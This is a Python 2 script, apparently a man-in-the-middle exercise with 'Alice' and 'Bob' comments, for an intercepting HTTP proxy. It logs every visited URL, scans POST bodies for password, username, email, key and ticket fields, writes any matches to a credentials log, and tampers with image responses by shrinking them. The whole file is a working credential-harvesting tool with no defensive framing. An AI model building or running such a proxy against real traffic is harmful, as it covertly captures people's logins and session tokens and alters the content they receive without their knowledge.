from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import StringIO
from urlparse import urlparse
import httplib
import logging
import re
import zlib
from SocketServer import ThreadingMixIn
from PIL import Image

HOST_NAME = ''
PORT_NUMBER = 4570


class Proxy_Server(BaseHTTPRequestHandler):
    interesting_parameters_list = ['pass', 'user', 'name', 'login', 'mail', 'key', 'ticket']
    image_format_list = ['bmp', 'jpg', 'jpeg', 'png']
    #protocol_version = 'HTTP/1.1'
    def response_content_handler(self, headers, body):
        #  checking for image
        content_type = ''
        content_encoding = ''
        for line in headers:
            if (line.split(':', 1)[0]).lower() == 'content-type':
                content_type = (line.split(':', 1)[1]).lower()
            if (line.split(':', 1)[0]).lower() == 'content-encoding':
                content_encoding = (line.split(':', 1)[1]).lower()
        if len(re.findall('image', content_type)) < 1:
            return headers, body

        #  uncompresing
        encoded_body = body
        if content_encoding == 'gzip':
            encoded_body = zlib.decompress(body)


        #  handling image
        im = Image.open(StringIO.StringIO(encoded_body))
        if im.format.lower() not in self.image_format_list:
            return headers, body
        try:
            out = im.resize(((im.size[0]+1)/2, (im.size[1]+1)/2))
        except:
            print 'Failed resizing image: ', self.requestline
            out = im
        output_image_buffer = StringIO.StringIO()
        try:
            out.save(output_image_buffer, format=im.format)
        except:
            output_image_buffer.close()
            print 'Failed saving image: ', self.requestline
            return headers, body
        output_image = output_image_buffer.getvalue()
        output_image_buffer.close()

        for line in headers:
            if (line.split(':', 1)[0]).lower() == 'content-length':
                #headers[key] = len(output_image)
                headers.remove(line)
                headers.append('content-length: ' + str(len(output_image)))
                break
        return headers, output_image


    def password_catcher(self, body):
        parameters = body.split('&')
        if len(parameters) < 2:
            return ""
        found_interesting_val = []
        for kv_pair in parameters:
            for interesting_parameters_list_value in self.interesting_parameters_list:
                if len(re.findall(interesting_parameters_list_value, kv_pair)) > 0:
                    found_interesting_val.append(kv_pair)
                    break
        return found_interesting_val


    def do_GET(self):
        global proxy_page_visit_logger
        global password_logger
        proxy_page_visit_logger.info(self.path)

        #  getting data from Alice, checking login credentials
        request_method = self.command
        request_url = self.path
        _request_len = self.headers.getheader('content-length')
        request_body = self.rfile.read(0 if _request_len is None else int(_request_len))
        request_headers = self.headers.dict  # as dictionary

        if request_method == 'POST':
            interesting_val = self.password_catcher(request_body)
            if len(interesting_val) > 0:
                log_info = self.path
                for val in interesting_val:
                    log_info += ' ' + val
                password_logger.info(log_info)

        #  connecting to Bob
        parsed_url = urlparse(request_url)
        fact = httplib.HTTPSConnection if parsed_url.scheme == 'https' else httplib.HTTPConnection
        conn = fact(parsed_url.netloc)
        conn.request(request_method, parsed_url.path + '?' + parsed_url.query, headers=request_headers,
                     body=request_body)

        #  geting response from Bob
        resp = conn.getresponse()
        respone_data = ''
        while True:
            _buff_line = resp.read(1)
            if _buff_line == '':
                break
            respone_data += _buff_line

        respone_headers = list(resp.msg.headers)

        def remove_header(fieldname, value=None):
            for line in respone_headers:
                if line.split(':', 1)[0].lower() == fieldname.lower():
                    if value is None:
                        respone_headers.remove(line)
                    else:
                        if line.split(':', 1)[1].lower() == value.lower():
                            respone_headers.remove(line)
                    break

        remove_header('Transfer-Encoding', 'chunked')
        remove_header('Connection')

        respone_headers.append('connection: close')
        respone_headers, respone_data = self.response_content_handler(respone_headers, respone_data)

        # replying to Alice
        self.send_response(resp.status)
        for val in respone_headers:
            new_header_key = val.split(':', 1)[0]
            new_header_val = val.split(':', 1)[1].rstrip('\r\n')
            self.send_header(new_header_key, new_header_val)
        # self.send_header("Content-type", "text/html; charset=utf-8") #  example header
        self.end_headers()
        self.wfile.write(respone_data)

    do_POST = do_GET
    do_CONNECT = do_GET


class ThreadedServer(ThreadingMixIn, HTTPServer):
    pass

if __name__ == "__main__":
    logging.basicConfig(filename='log.txt', level=logging.INFO, format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
    proxy_page_visit_logger = logging.getLogger('VISIT')
    password_logger = logging.getLogger('CREDENTIALS')
    httpd = HTTPServer((HOST_NAME, PORT_NUMBER), Proxy_Server)
    #httpd = ThreadedServer((HOST_NAME, PORT_NUMBER), Proxy_Server)
    while 1:
        httpd.serve_forever()


